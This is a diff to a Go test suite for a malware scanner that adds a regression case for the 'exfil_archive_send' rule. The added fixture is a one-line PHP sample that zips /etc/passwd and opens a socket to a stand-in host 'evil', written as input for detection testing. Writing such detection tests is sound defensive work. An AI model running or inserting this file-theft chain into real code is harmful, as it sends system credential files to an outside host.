@@ -93,6 +93,12 @@ class wpml_zip {
 	if !hasRule(matches, "exfil_archive_send") {
 		t.Error("exfil_archive_send regression: real zip+fwrite exfil chain was not detected")
 	}
+
+	malicious = []byte(`<?php $z = new \ZipArchive(); $z->open('/tmp/d.zip', 1); $z->addFile('/etc/passwd'); fwrite(fsockopen('evil',80), 'PWND');`)
+	matches = scanner.ScanContent(malicious, ".php")
+	if !hasRule(matches, "exfil_archive_send") {
+		t.Error("exfil_archive_send regression: namespaced ZipArchive exfil chain was not detected")
+	}
 }
 
 func TestDropperFgcEval_TwigIntegrationTestCase(t *testing.T) {
